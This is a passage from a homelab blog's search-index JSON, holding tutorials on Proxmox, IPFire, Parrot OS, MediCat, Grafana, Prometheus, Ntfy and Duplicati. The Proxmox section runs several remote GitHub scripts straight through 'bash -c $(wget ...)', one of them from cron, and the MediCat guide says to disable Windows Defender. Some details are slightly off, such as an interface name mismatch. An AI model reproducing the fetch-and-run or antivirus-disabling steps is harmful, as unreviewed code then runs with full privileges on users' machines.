reboot, we need to add this configuration to the network interfaces file. Open the file using:❯ nano /etc/network/interfacesLook for your interface (in our case eno1) and add the following line below the iface configuration:post-up /usr/sbin/ethtool -s enp6s0 wol gThe section for eno1 should now look something like this:auto eno1  iface eno1 inet manual  post-up /usr/sbin/ethtool -s eno1 wol gThis ensures that WoL will remain enabled after reboots.Reload Proxmox Network SettingsTo apply the changes, reload the network configuration from the Proxmox GUI. Go to your Proxmox node, then navigate to System &gt; Network. Find your WoL-enabled interface (eno1), click “Edit,” and add the “Autostart” flag. Save the changes.Testing Wake-on-LANNow that the configuration is set, you can test it. Turn off your Proxmox node and use a WoL tool to send a magic packet to the node’s network interface. I’m using the built-in WoL feature in ipfire to send the magic packet.If your Proxmox node powers up, the Wake-on-LAN setup is complete and working correctly."
  },
  
  {
    "title": "IPFire Firewall on Proxmox",
    "url": "/posts/ipfire/",
    "categories": "Virtualization",
    "tags": "",
    "date": "2024-09-22 00:00:00 +0530",
    





    
    "snippet": "Installing IPFire Firewall on ProxmoxIPFire is a powerful open-source firewall that can be installed on both 32-bit and 64-bit systems. If you have an old PC lying around, you can repurpose it as a...",
    "content": "Installing IPFire Firewall on ProxmoxIPFire is a powerful open-source firewall that can be installed on both 32-bit and 64-bit systems. If you have an old PC lying around, you can repurpose it as a firewall. IPFire is known for its flexibility, and it’s great for securing networks in both home and small business environments.  Open-source: It’s free and constantly updated by the community.  Security: Offers strong protection for your network with features like intrusion detection, VPN, and more.  Customizable: It can be tailored to your specific network needs.Download the ipfire ISOTo get started, you’ll need to download the IPFire ISO. Run the following command to download the ISO directly to your Proxmox storage:wget -O /mnt/pve/$storage/template/iso/ipfire-2.29-core188-x86_64.iso https://downloads.ipfire.org/releases/ipfire-2.x/2.29-core188/ipfire-2.29-core188-x86_64.isocreating the vmTo create a virtual machine (VM) for IPFire in Proxmox, follow these steps:  Click on Create VM.  Go to the General tab and set the preferred VM ID and name.  In the OS section, choose the downloaded IPFire ISO from $storage.  Set up the disk as per your requirements in the Disk section.  Configure CPU and Memory depending on your system needs.Once the VM is created, add two network interfaces: one for WAN and one for LAN.System Requirements            Component      Minimum Requirements      Recommended Requirements                  Processor (CPU)      1 GHz single-core      Multi-core (2+ cores) with AES-NI support              Memory (RAM)      1 GB      2-4 GB or more, especially for IDS/IPS, VPN              Storage      4 GB (HDD/SSD)      20 GB SSD for better performance and longevity              Network Interface      At least 2 NICs (10/100 Mbps)      2 NICs (Gigabit) Intel or Broadcom NICs for reliability        If you prefer to install IPFire on bare metal, you can create bootable media. Visit the official IPFire Download page and grab the ISO image according to your system architecture.Installing the distributionOnce the vm is created and the two networking nics are attached start the vm.Next, choose the Language as respective to your region.At this step, you can see that, if you do not wish to continue the setup you can Cancel the setup and reboot the machine.Accept the license by pressing the Space bar to choose, and press OK to continue.The system will format your disk to install the IPFire system. Please note that all data on the disk will be erased.Next, choose the file system as EXT4 and continue to the future steps.Once, you select the filesystem type, the installation begins and disk will be formatted and system files will be installed.Once installation completes, press OK to reboot to finalize the installation and continue with the further installation to configure ISDN, network cards, and system passwords.After the system reboot, it will prompt you IPFire boot menu option, select the default option by pressing the enter key.choose the keyboard layout from the drop-down list as shown below. and choose the time zone you preffered                               Choose a hostname for our IPFirewall machine. By default, it will be ipfire. I’m not going to make any changes in these steps. and Give a valid domain name, if you have a local DNS server or we can define it later. Here, I am using “secsys.pro” as my local DNS server domain name.                               Enter a password for the root and admin user, This will be used for command-line access and provide a password for the admin user for the IPFire GUI web interface. The password must be different from the command line access credentials for security reasons.                               IPFire Network Configuration SettingsDuring IPFire installation, the network is configured into various segments. This segmented security scheme indicates that there is a suitable place for each system in the network and it can be enabled separately as per our requirements.Each segment acts as a group of machines that share a common security level, which is described in four different colors of zones i.e. Green, Red, Blue, and Orange.  Green  – This represents that we are in a safe area. Clients in the Green area will be without any restrictions and connected internally/locally.  Red  – This indicates that we are in danger or disconnected from the outside world; nothing will be allowed through the firewall unless specifically configured by the admins.  Blue  – This represents the ‘wireless‘ network, which is used for the local area network.  Orange  – This refers to the ‘DMZ‘ (demilitarized zone). Any servers that are accessible publicly are separated from the rest of the network to minimize security breaches.                               Once the Network configuration type is selected then network cards to each adaptor RED and Green zones                               Assign IP Addresses for Network InterfacesHere we have only 2 interfaces and we need to assign IP addresses in different sub-nets one for the RED zone and another for Green zoneIf we use 192.168.0.100 for the RED interface, we must use different IP and network for other interface. For the RED interface we going to use static IP address for both RED and green zones                               If you want to enable the DHCP for the GREEN interface for the local/internal interfaces you can can configure the DHCP pool range as i am using the tp-link (TL-S3210) for DHCP service will skip the DHCP.We have almost completed our setup, Choose OK to complete the IPFire setup.Accessing Web interfaceTo access the web interface connect to the green network and enter https://$I:444/ with the username as “admin” and the password that we’ve set at above.conclusionIPFire is a versatile firewall solution suitable for various environments. Whether you are setting it up for home or small business use, its security features, flexibility, and community-driven updates make it a great choice for protecting your network. for more settings and customization please reffer the official IPfire documentation"
  },
  
  {
    "title": "Installing Parrot OS on Proxmox VM",
    "url": "/posts/parrot/",
    "categories": "Virtualization",
    "tags": "",
    "date": "2024-09-03 00:00:00 +0530",
    





    
    "snippet": "Installing Parrot OS on ProxmoxIn this guide, we’ll walk through the process of installing Parrot OS on a Proxmox virtual machine. Parrot OS is a popular security-focused operating system, and runn...",
    "content": "Installing Parrot OS on ProxmoxIn this guide, we’ll walk through the process of installing Parrot OS on a Proxmox virtual machine. Parrot OS is a popular security-focused operating system, and running it on Proxmox allows you to experiment within a virtualized environment.Step 1: Download the Parrot OS ISOFirst, download the Parrot OS ISO from the official website. Below is the command for downloading the ISO directly to your Proxmox server:wget -O /mnt/pve/$storage/template/iso/Parrot-security-6.1_amd64.iso https://deb.parrot.sh/parrot/iso/6.1/Parrot-security-6.1_amd64.isoThis will save the ISO file to your Proxmox storage.Step 2: Create a Virtual Machine on ProxmoxOnce the ISO is downloaded, go to the Proxmox web interface and click on the “Create VM” button to start creating a new virtual machine.  Name your VM: In the General tab, give your VM a name, for example, “Parrot OS.”  Select ISO image: Under the OS tab, select the Parrot OS ISO that you just downloaded. Keep the system settings as default.  Configure Disk: Parrot OS requires a minimum of 16 GB of disk space, but for this setup, we’ll allocate 100 GB. Choose the storage location, format it to QCOW2, and configure the disk settings  Allocate CPU and Memory: Assign the number of cores and memory for the virtual machine according to your requirements. For a smooth experience, you can allocate 2 cores and 4 GB of RAM.                                 Review and Confirm: Review the VM configuration and check the box that says “Start after created” to boot the VM automatically after creation.Step 3: Install Parrot OSOnce the VM is created and booted, open the console from the Proxmox interface.  Boot into the Installer: When the VM starts, you’ll see the Parrot OS boot menu. Select the “Try/Install” option to begin the installation process.                                 Select Preferences: Choose your preferred language, location, and keyboard layout.                                              Disk Partitioning: Erase the disk and select “Swap to a file” for swap management. Create a user account and verify the settings.                                 Complete Installation: Once you confirm the settings, the installation will begin. After the installation is complete, the VM will reboot, and you’ll be ready to use Parrot OS on Proxmox.                               Step 4: Post InstallationOnce the installation is completed open the terminal and perform the update to update the security patchessudo apt update &amp;&amp; sudo apt upgrade -y &amp;&amp; sudo apt dist-upgrade -y &amp;&amp; sudo apt autoremove -y &amp;&amp; sudo apt autoclean -y &amp;&amp; sudo apt clean -yFor advanced configurations, such as customizing the installation further or troubleshooting, refer to the official Parrot OS installation guide."
  },
  
  {
    "title": "Post Proxmox",
    "url": "/posts/proxmox/",
    "categories": "Virtualization",
    "tags": "",
    "date": "2024-08-28 00:00:00 +0530",
    





    
    "snippet": "IntroductionAfter installing Proxmox VE (Virtual Environment), there are several essential post-installation steps to ensure that your system is configured correctly and optimized for performance. ...",
    "content": "IntroductionAfter installing Proxmox VE (Virtual Environment), there are several essential post-installation steps to ensure that your system is configured correctly and optimized for performance. This guide walks you through managing Proxmox VE repositories, updating the system, handling processor microcode updates, and setting up automatic LXC updates.1. Managing Proxmox VE RepositoriesProxmox VE repositories need to be configured correctly to ensure you receive updates and access the necessary packages. The following script helps manage these repositories by:  Disabling the Enterprise Repo.  Adding or correcting Proxmox VE sources.  Enabling the No-Subscription Repo.  Adding the Test Repo.  Disabling the subscription nag.Running the Repository Management ScriptTo streamline the configuration process, run the following command in the Proxmox VE Shell:bash -c \"$(wget -qLO - https://github.com/tteck/Proxmox/raw/main/misc/post-pve-install.sh)\"Note: It is recommended to answer “yes” (y) to all options presented during the process. This will ensure that all necessary configurations and updates are applied correctly.Script OutputThe script performs several tasks, including:  Correcting Proxmox VE sources.  Disabling the ‘pve-enterprise’ repository and enabling the ‘pve-no-subscription’ repository.  Correcting Ceph package repositories and adding the ‘pvetest’ repository.  Disabling the subscription nag (you might need to delete your browser cache).  Updating Proxmox VE. ____ _    ________   ____             __     ____           __        ____/ __ \\ |  / / ____/  / __ \\____  _____/ /_   /  _/___  _____/ /_____ _/ / // /_/ / | / / __/    / /_/ / __ \\/ ___/ __/   / // __ \\/ ___/ __/ __ `/ / // ____/| |/ / /___   / ____/ /_/ (__  ) /_   _/ // / / (__  ) /_/ /_/ / / //_/     |___/_____/  /_/    \\____/____/\\__/  /___/_/ /_/____/\\__/\\__,_/_/_/ ✓ Corrected Proxmox VE Sources ✓ Disabled 'pve-enterprise' repository ✓ Enabled 'pve-no-subscription' repository ✓ Corrected 'ceph package repositories' ✓ Added 'pvetest' repository ✓ Disabled subscription nag (Delete browser cache) ✓ Disabled high availability ✓ Updated Proxmox VE ✗ Selected no to Rebooting Proxmox VE (Reboot recommended) ✓ Completed Post Install Routines ✗ Selected no to Rebooting Proxmox VE (Reboot recommended) ✓ Completed Post Install Routines2. Updating Processor MicrocodeProcessor microcode updates are crucial for fixing hardware bugs and improving performance. This section covers how to update microcode for Intel or AMD processors.Running the Microcode Update ScriptExecute the following command in the Proxmox VE Shell to handle microcode updates:bash -c \"$(wget -qLO - https://github.com/tteck/Proxmox/raw/main/misc/microcode.sh)\"Checking Microcode UpdatesAfter running the script and rebooting the system, verify that microcode updates are applied by executing:journalctl -k | grep -E \"microcode\" | head -n 1 ____                                               __  ____                                __/ __ \\_________  ________  ______________  _____   /  |/  (_)_____________  _________  ____/ /__/ /_/ / ___/ __ \\/ ___/ _ \\/ ___/ ___/ __ \\/ ___/  / /|_/ / / ___/ ___/ __ \\/ ___/ __ \\/ __  / _ \\/ ____/ /  / /_/ / /__/  __(__  |__  ) /_/ / /     / /  / / / /__/ /  / /_/ / /__/ /_/ / /_/ /  __//_/   /_/   \\____/\\___/\\___/____/____/\\____/_/     /_/  /_/_/\\___/_/   \\____/\\___/\\____/\\__,_/\\___/ ✓ GenuineIntel was detected ✓ Installed iucode-tool ✓ Downloaded the Intel Processor Microcode Package intel-microcode_3.20240514.1~deb12u1_amd64.deb ✓ Installed intel-microcode_3.20240514.1~deb12u1_amd64.deb ✓ CleanedIn order to apply the changes, a system reboot will be necessary.3. Setting Up Automatic LXC UpdatesTo keep your LXCs (Linux Containers) up-to-date, you can schedule a cron job that updates all LXCs every Sunday at midnight. This helps in maintaining the security and performance of your containers.Running the LXC Updater ScriptTo set up the cron job, run the following command in the Proxmox VE Shell:bash -c \"$(wget -qLO - https://github.com/tteck/Proxmox/raw/main/misc/cron-update-lxcs.sh)\"Excluding Specific LXCsIf you need to exclude specific LXCs from updating, edit the crontab (use crontab -e) and add the CTID(s) as shown in the example:0 0 * * 0 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin /bin/bash -c \"$(wget -qLO - https://github.com/tteck/Proxmox/raw/main/misc/update-lxcs-cron.sh)\" -s 103 111 &gt;&gt;/var/log/update-lxcs-cron.log 2&gt;/dev/nullConclusionProperly configuring and maintaining your Proxmox VE installation is crucial for ensuring optimal performance and security. By following these post-installation steps, including managing repositories, updating microcode, and setting up automatic LXC updates, you can ensure that your Proxmox VE environment is optimized and running smoothly. If you encounter any issues or have questions, consult the Proxmox documentation or community forums for additional support."
  },
  
  {
    "title": "Medicat",
    "url": "/posts/medicat/",
    "categories": "Windows",
    "tags": "",
    "date": "2024-08-21 00:00:00 +0530",
    





    
    "snippet": "Installing MediCatIn this guide, we’ll walk through the steps to install MediCat on a USB drive. MediCat is a powerful tool for diagnostics, troubleshooting, and recovery.PrerequisitesBefore we beg...",
    "content": "Installing MediCatIn this guide, we’ll walk through the steps to install MediCat on a USB drive. MediCat is a powerful tool for diagnostics, troubleshooting, and recovery.PrerequisitesBefore we begin, make sure you have the following:  A USB drive with at least 32GB of space (Recomended 64GB)  A USB drive with Ventoy already installed (Recomended)  A downloaded archive of MediCat (~22GB)  Windows Defender and other antivirus tools temporarily disabled (since they may interfere with the installation process)  Please select the USB drive carefully during the installation process, as the disk will be completely wiped.Step 1: Preparing the USB DriveTo start, you’ll need to install Ventoy on your USB drive. Ventoy is a tool that allows you to create a bootable USB drive that can host multiple ISO files without reformatting the drive.Begin by downloading the latest version of Ventoy from the official website. Once downloaded, extract the Ventoy archive to a folder on your computer.In the extracted folder, locate and run the Ventoy2Disk.exe (or the corresponding executable for your operating system).Next, select the USB drive you want to use with Ventoy. Be cautious when choosing the drive, as this process will format it. After confirming that you’ve selected the correct drive, click the “Install” button. The tool will prompt you to confirm the installation, warning that all data on the USB drive will be erased. Confirm and proceed.Once the installation is complete, you will see a success message. Your USB drive is now ready with Ventoy installed.Since we’ve manually installed Ventoy, there’s no need to format the USB drive again. Additionally, it’s important to temporarily disable Windows Defender and any other antivirus tools because they may interfere with the installation process.After disabling Windows Defender, you can proceed by launching the MediCat installer and accepting the license agreement.                               Step 2: Installing MediCatThe installer will prompt you to select the disk where MediCat will be installed. Double-check that you have selected the correct drive to avoid any data loss. During the installation of MediCat, you have the option to disable drive formatting. This step is crucial if you have already installed Ventoy, as formatting the disk would remove Ventoy from the USB drive. Make sure to disable formatting before proceeding.                               Step 3: Handling the MediCat ArchiveIf you already have the MediCat archive downloaded (approximately 22GB), select “No” when asked to download it during the installation process. Then, manually select the downloaded file. This saves time, as downloading it again would take a while.If you haven’t downloaded the archive yet, you can opt to download it during this step, though it will extend the installation time.Step 4: Finalizing the InstallationOnce you’ve selected the MediCat archive file (or downloaded it), the installer will begin the installation process. If you’ve chosen the “Download Now” option, the file will be downloaded first, and then the installation will proceed.  As medicat needs to install/configure the 22GB archive it’s took me about 2 hour 40 minutes to complete the installation/checks.Congratulations! You’ve successfully installed MediCat on your USB drive."
  },
  
  {
    "title": "Grafana",
    "url": "/posts/grafana/",
    "categories": "Linux",
    "tags": "Linux",
    "date": "2024-07-24 00:00:00 +0530",
    





    
    "snippet": "Grafana is a powerful open-source analytics and monitoring tool that allows you to visualize data in a highly customizable way. This guide will walk you through the steps to install Grafana from th...",
    "content": "Grafana is a powerful open-source analytics and monitoring tool that allows you to visualize data in a highly customizable way. This guide will walk you through the steps to install Grafana from the APT repository on a Debian system.PrerequisitesBefore you start, make sure your system is up-to-date. Run the following commands to update your package list and upgrade all installed packagessudo apt-get updatesudo apt-get upgrade -yAdditionally, ensure that you have sudo privileges to execute administrative commands.Step 1: Install Prerequisite PackagesGrafana requires some prerequisite packages. Install them by running the following command:sudo apt-get install -y apt-transport-https software-properties-common wget  apt-transport-https: Allows APT to communicate over HTTPS, which is required for secure access to external repositories.  software-properties-common: Provides a utility for managing software repositories.  wget: A utility to download files from the web.Step 2: Import the Grafana GPG KeyTo ensure the integrity of the packages you are about to install, you need to import the Grafana GPG key. This key is used to verify the authenticity of the packages. Run the following commands:sudo mkdir -p /etc/apt/keyrings/wget -q -O - https://apt.grafana.com/gpg.key | gpg --dearmor | sudo tee /etc/apt/keyrings/grafana.gpg &gt; /dev/null  mkdir -p /etc/apt/keyrings/: Creates a directory to store GPG keys.  wget -q -O - https://apt.grafana.com/gpg.key: Downloads the Grafana GPG key.  gpg –dearmor: Converts the GPG key to a format that APT can use.  sudo tee /etc/apt/keyrings/grafana.gpg &gt; /dev/null: Saves the key to the appropriate location.Step 3: Add the Grafana APT RepositoryNext, you need to add the Grafana APT repository to your system’s list of package sources. This will allow you to install Grafana directly from the APT repository. You have two options:Stable ReleasesFor stable releases of Grafana, run the following command:echo \"deb [signed-by=/etc/apt/keyrings/grafana.gpg] https://apt.grafana.com stable main\" | sudo tee -a /etc/apt/sources.list.d/grafana.listBeta ReleasesIf you want to install beta releases of Grafana, use this command instead:echo \"deb [signed-by=/etc/apt/keyrings/grafana.gpg] https://apt.grafana.com beta main\" | sudo tee -a /etc/apt/sources.list.d/grafana.listThis will add the chosen repository to your system’s package sources.Step 4: Update the Package ListAfter adding the repository, you need to update the list of available packages:sudo apt-get updateThis will fetch the latest package information from the newly added Grafana repository.Step 5: Install Grafana OSFinally, to install the latest open-source release of Grafana, run the following command:sudo apt-get install grafanaThis will download and install Grafana and its dependencies.Step 6: Start and Enable GrafanaAfter the installation is complete, you can start Grafana and enable it to start at boot with the following commands:sudo systemctl start grafana-serversudo systemctl enable grafana-server  start grafana-server: Starts the Grafana service immediately.  enable grafana-server: Configures Grafana to start automatically on system boot.Step 7: Access GrafanaGrafana runs on port 3000 by default. You can access the Grafana web interface by opening your web browser and navigating to:http://your-server-ip:3000  Change the /etc/grafana/grafana.ini file according to your needs and restart the grafana serviceReplace your-server-ip with your server’s actual IP address.Default Login CredentialsThe default username and password for Grafana are:  Username: admin  Password: adminUpon the first login, you will be prompted to change the password. Once you logged in add the data source and start configuring grafana to monitor and visualize your data.For more detailed documentation and advanced configuration options, visit the official Grafana documentation"
  },
  
  {
    "title": "Prometheus",
    "url": "/posts/prometheus/",
    "categories": "Linux",
    "tags": "Linux",
    "date": "2024-07-20 00:00:00 +0530",
    





    
    "snippet": "IntroductionPrometheus is a powerful open-source monitoring system and time series database. This guide walks you through installing and configuring Prometheus on a Linux system. By the end of this...",
    "content": "IntroductionPrometheus is a powerful open-source monitoring system and time series database. This guide walks you through installing and configuring Prometheus on a Linux system. By the end of this tutorial, you’ll have Prometheus up and running, ready to monitor your infrastructure.1. Create Prometheus UserFirst, create a dedicated Prometheus user to enhance security:sudo useradd -M prometheussudo usermod -L prometheus2. Set Up DirectoriesNext, create the necessary directories for Prometheus and set the correct ownership:sudo mkdir /etc/prometheussudo mkdir /var/lib/prometheussudo chown prometheus:prometheus /etc/prometheussudo chown prometheus:prometheus /var/lib/prometheus3. Download and Extract PrometheusDownload the latest Prometheus release from GitHub:cd ~wget https://github.com/prometheus/prometheus/releases/download/prometheus.linux-amd64.tar.gzsha256sum prometheus.linux-amd64.tar.gz # Verify the checksum before extractingtar xvf prometheus.linux-amd64.tar.gz4. Install PrometheusCopy the Prometheus binaries to the appropriate directories:sudo cp prometheus.linux-amd64/prometheus /usr/local/bin/sudo cp prometheus.linux-amd64/promtool /usr/local/bin/sudo chown prometheus:prometheus /usr/local/bin/prometheussudo chown prometheus:prometheus /usr/local/bin/promtoolMove configuration files to /etc/prometheus:sudo cp -r prometheus.linux-amd64/prometheus.yml /etc/prometheus/sudo cp -r prometheus.linux-amd64/consoles /etc/prometheussudo cp -r prometheus.linux-amd64/console_libraries /etc/prometheussudo chown -R prometheus:prometheus /etc/prometheus/prometheus.ymlsudo chown -R prometheus:prometheus /etc/prometheus/consolessudo chown -R prometheus:prometheus /etc/prometheus/console_libraries5. Configure PrometheusEdit the Prometheus configuration file:sudo vi /etc/prometheus/prometheus.yml# my global configglobal:  scrape_interval:     15s # Set the scrape interval to every 15 seconds. Default is every 1 minute.  evaluation_interval: 15s # Evaluate rules every 15 seconds. The default is every 1 minute.  # scrape_timeout is set to the global default (10s).# Alertmanager configurationalerting:  alertmanagers:  - static_configs:    - targets:      # - alertmanager:port# Load rules once and periodically evaluate them according to the global 'evaluation_interval'.rule_files:  # - \"first_rules.yml\"  # - \"second_rules.yml\"# A scrape configuration containing exactly one endpoint to scrape:# Here it's Prometheus itself.scrape_configs:  # The job name is added as a label `job=&lt;job_name&gt;` to any timeseries scraped from this config.  - job_name: 'prometheus'    # metrics_path defaults to '/metrics'    # scheme defaults to 'http'.    static_configs:    - targets: ['localhost:3004']#################################################################################################  - job_name: '$NAME'    metrics_path: '/api/v1/allmetrics'    params:      # format: prometheus | prometheus_all_hosts      # You can use `prometheus_all_hosts` if you want Prometheus to set the `instance` to your hostname instead of IP      format: [prometheus_all_hosts]      #      # source: as-collected | raw | average | sum | volume      # default is: average      #source: [as-collected]      #      # server name for this prometheus - the default is the client IP      # for Netdata to uniquely identify it      server: ['grove']    honor_labels: true    static_configs:      - targets: ['$IP:PORT']#################################################################################################                                                                                                                                          This setup configures Prometheus to scrape metrics from itself at localhost:3004.6. Create an Init Script for PrometheusCreate the init script to manage the Prometheus service:sudo nano /etc/init.d/prometheusCopy the init script from the provided code, then save and close the file.#!/bin/sh### BEGIN INIT INFO# Provides:          prometheus# Required-Start:    $remote_fs# Required-Stop:     $remote_fs# Should-Start:      $all# Should-Stop:       $all# Default-Start:     2 3 4 5# Default-Stop:      0 1 6# Short-Description: monitoring system and time series database.# Description:       Prometheus is a systems and service monitoring system.#                    It collects metrics from configured targets at given intervals,#                    evaluates rule expressions, displays the results,#                    and can trigger alerts if some condition is observed to be true.### END INIT INFOset -e. /lib/lsb/init-functionsNAME=prometheusDESC=\"Prometheus monitoring system\"DAEMON=/usr/local/bin/prometheusUSER=prometheusCONFIGDIR=/etc/prometheusDATADIR=/var/lib/prometheus/dataPID=\"/var/run/prometheus/$NAME.pid\"LOG=\"/var/log/prometheus/$NAME.log\"GOSU=/usr/sbin/gosuALERTMANAGER_OPTS=DAEMON_OPTS=\"$ALERTMANAGER_OPTS\"DAEMON_OPTS=\"$DAEMON_OPTS --config.file=$CONFIGDIR/prometheus.yml --storage.tsdb.path=$DATADIR\"DAEMON_OPTS=\"$DAEMON_OPTS --web.console.templates=$CONFIGDIR/consoles --web.console.libraries=$CONFIGDIR/console_libraries\"# Check if DAEMON binary exist[ -f $DAEMON ] || exit 0[ -f \"/etc/default/$NAME\" ] &amp;&amp; . /etc/default/$NAMEservice_not_configured () {  if [ \"$1\" != \"stop\" ]; then    printf \"\\tPlease configure $NAME and then edit /etc/default/$NAME\\n\"    printf \"\\tand set the \\\"START\\\" variable to \\\"yes\\\" in order to allow\\n\"    printf \"\\t$NAME to start.\\n\"  fi  exit 0}service_checks () {  # Check if START variable is set to \"yes\", if not we exit.  if [ \"$START\" != \"yes\" ]; then    service_not_configured $1  fi  # Prepare directories  mkdir -p \"/var/run/prometheus\" \"/var/log/prometheus\"  chown -R $USER \"/var/run/prometheus\" \"/var/log/prometheus\"  # Check if PID exists  if [ -f \"$PID\" ]; then    PID_NUMBER=`cat $PID`    if [ -z \"`ps axf | grep ${PID_NUMBER} | grep -v grep`\" ]; then      echo \"Service was aborted abnormally; clean the PID file and continue...\"      rm -f \"$PID\"    else      echo \"Service already started; skip...\"      exit 1    fi  fi}start () {  service_checks $1  $GOSU $USER   $DAEMON $DAEMON_OPTS  &gt; $LOG 2&gt;&amp;1  &amp;  RETVAL=$?  echo $! &gt; $PID  if [ $RETVAL ]; then    log_end_msg 0  else    log_end_msg 1  fi}stop () {  if start-stop-daemon --retry TERM/5/KILL/5 --oknodo --stop --quiet --pidfile $PID 2&gt;&amp;1 1&gt;$LOG  then    log_end_msg 0    rm $PID  else    log_end_msg 1  fi}case \"$1\" in  start)    log_daemon_msg \"Starting $DESC -\" \"$NAME\"    start    ;;  stop)    log_daemon_msg \"Stopping $DESC -\" \"$NAME\"    stop    ;;  reload)    log_daemon_msg \"Reloading $DESC configuration -\" \"$NAME\"    if start-stop-daemon --stop --signal HUP --quiet --oknodo --pidfile $PID --startas /bin/bash -- -c \"exec $DAEMON $DAEMON_OPTS &gt; $LOG 2&gt;&amp;1\"    then      log_end_msg 0    else      log_end_msg 1      fi    ;;  restart|force-reload)    log_daemon_msg \"Restarting $DESC -\" \"$NAME\"    stop    start    ;;  syntax)    $DAEMON --help    ;;  status)    status_of_proc -p $PID $DAEMON $NAME    ;;  *)    log_action_msg \"Usage: /etc/init.d/$NAME {start|stop|reload|restart|force-reload|syntax|status}\"    ;;esacexit 07. Start and Enable Prometheus ServiceTo start and restart the Prometheus service, use the following commands:sudo service prometheus startsudo service prometheus enablesudo service prometheus statusFor more details and advanced configurations, refer to the official Prometheus documentation."
  },
  
  {
    "title": "Ntfy Push Notifications",
    "url": "/posts/ntfy/",
    "categories": "Docker",
    "tags": "",
    "date": "2023-07-07 00:00:00 +0530",
    





    
    "snippet": "What is Ntfy Push Notifications?Ntfy is a powerful yet simple server for sending and receiving push notifications. It allows you to publish notifications from any system or service to your devices ...",
    "content": "What is Ntfy Push Notifications?Ntfy is a powerful yet simple server for sending and receiving push notifications. It allows you to publish notifications from any system or service to your devices using an easy-to-use HTTP API. Ntfy is particularly handy for setting up notifications for events like system failures, completed tasks, or any important updates that you want to monitor in real-time.Why Use Ntfy?Ntfy stands out due to its simplicity and flexibility. It’s an open-source project that you can self-host, meaning you retain full control over your data. Ntfy works seamlessly with services like IFTTT, Home Assistant, and others, making it an ideal choice for those who prefer to have notifications sent directly to their devices without relying on third-party services.Key Advantages:  Self-hosted: Complete control over your notifications and data.  Easy Integration: Works with various services and systems via a simple HTTP API.  Customizable: You can tailor notifications to fit your specific needs.Use Cases of Ntfy  System Monitoring: Receive real-time alerts when your servers encounter issues.  Task Automation: Get notified when long-running tasks are completed.  Home Automation: Integrate with smart home systems like Home Assistant to receive alerts for events such as doors opening or devices malfunctioning.  Personal Projects: Keep track of your projects or scripts with instant notifications when something important happens.Prerequisites  Docker Engine and Docker Compose packages are installed and running.  A non-root user with Docker privileges.  if you dont want to use the docker you can check the binaries releases page for binaries and deb/rpm packages.Setting Up the Ntfy ServerCreate the Directory StructureTo keep things organized, create a dedicated directory for Ntfy. Here’s the file structure:mkdir ~/docker/ntfy/{etc/ntfy,var/cache/ntfy}touch ~/docker/ntfy/docker-compose.yml📂 ntfy|--📑 docker-compose.yml|--📂 etc|   `--📂 ntfy|       `--📑 server.yml`--📂 var    `--📂 cache        `--📂 ntfyDocker ConfigurationWith the directory structure in place, let’s edit the docker-compose.yml file using your favorite text editor. Here’s an example configuration:sample docker.yaml:services:  ntfy:    image: binwiederhier/ntfy    container_name: ntfy    command:      - serve    environment:      - TZ=Asia/Kolkata    volumes:      - ./var/cache/ntfy:/var/cache/ntfy      - ./etc/ntfy:/etc/ntfy    ports:      - 80:80      #- 9090:9090 # to enable metrics    restart: unless-stopped    networks:      - proxy#    labels:#      - \"traefik.enable=true\"#      - \"traefik.http.routers.ntfy.entrypoints=http\"#      - \"traefik.http.routers.ntfy.rule=Host(`ntfyalertmaster.secsys.pro`)\"#      - \"traefik.http.middlewares.ntfy-https-redirect.redirectscheme.scheme=https\"#      - \"traefik.http.routers.ntfy.middlewares=ntfy-https-redirect\"#      - \"traefik.http.routers.ntfy-secure.entrypoints=https\"#      - \"traefik.http.routers.ntfy-secure.rule=Host(`ntfyalertmaster.secsys.pro`)\"#      - \"traefik.http.routers.ntfy-secure.tls=true\"#      - \"traefik.http.routers.ntfy-secure.service=ntfy\"#      - \"traefik.http.services.ntfy.loadbalancer.server.port=80\"#      - \"traefik.docker.network=proxy\"#      - \"traefik.http.routers.ntfy-secure.middlewares=authelia@file\"#      - \"com.centurylinklabs.watchtower.enable=true\"networks:  proxy:    external: true      sample server.yml:base-url: \"https://ntfy.sh\"attachment-cache-dir: \"/var/cache/ntfy/attachments\"attachment-total-size-limit: \"5G\"attachment-file-size-limit: \"15M\"attachment-expiry-duration: \"3h\"visitor-attachment-total-size-limit: \"100M\"visitor-attachment-daily-bandwidth-limit: \"500M\"# Monitoring metrics # enable-metrics: true  # metrics-listen-http: \"$IP:9090\"enabling Monitoring metricsyou can scrape the metrics by using Grafana by scrape data using PrometheusIn Prometheus, an example scrape config would look like this:scrape_configs:  - job_name: \"ntfy\"    static_configs:      - targets: [\"$IP:9090\"]Verify and Launch the ContainerTo verify the Docker Compose file has no issues, use the following command:docker compose configOnce you’ve confirmed that the docker-compose.yml file is correct, you can launch the container in the background:docker-compose up -dThis will create the volume, download the image, and start the container in the background.To verify the status of all running containers, run the following command:docker-compose ps# ORdocker ps -aIf something goes wrong, you can check the logs for each container using the docker logs command. For example, to check the log of the Ntfy container, run the following command:docker logs ntfy# ORdocker compose logs -f ntfyAccessing the Ntfy DashboardIf all is well, you can access your Ntfy Server locally by navigating to http://$IP:80 in your web browser.For more advanced configuration options, refer to the Ntfy manual."
  },
  
  {
    "title": "Duplicati",
    "url": "/posts/duplicati/",
    "categories": "Docker",
    "tags": "",
    "date": "2023-06-02 00:00:00 +0530",
    





    
    "snippet": "Duplicati is a powerful backup solution that supports standard protocols like FTP, SSH, WebDAV, and integrates with popular cloud services such as Microsoft OneDrive, Amazon Cloud Drive &amp; S3, G...",
    "content": "Duplicati is a powerful backup solution that supports standard protocols like FTP, SSH, WebDAV, and integrates with popular cloud services such as Microsoft OneDrive, Amazon Cloud Drive &amp; S3, Google Drive, Box.com, Mega, hubiC, and more.What is Duplicati?Duplicati is an open-source backup software designed for secure and efficient backups. It supports strong encryption, incremental backups, and is highly configurable, making it suitable for both personal and professional use.Core Features of Duplicati  Incremental Backups: Save time and storage space by only backing up changes.  Encryption: Protect your data with AES-256 encryption.  Scheduling: Automate your backup tasks.  Cross-Platform: Works on Windows, macOS, and Linux.  Cloud Integration: Seamless integration with major cloud storage providers.Why Use Duplicati?Duplicati is ideal for users who need a flexible and reliable backup solution that can be tailored to different environments. Whether you’re backing up data locally or to the cloud, Duplicati ensures your files are secure and easily recoverable.Prerequisites  Docker Engine and Docker Compose packages are installed and running  A non-root user with Docker privilegesSetting Up the Duplicati ServerCreate the Directory StructureTo keep things organized, create a dedicated directory for Duplicati. Here’s the file structure:mkdir ~/docker/duplicati/datatouch ~/docker/duplicati/docker-compose.yml📂 duplicati|--📂 data|   |--📂 config|   |   |-- 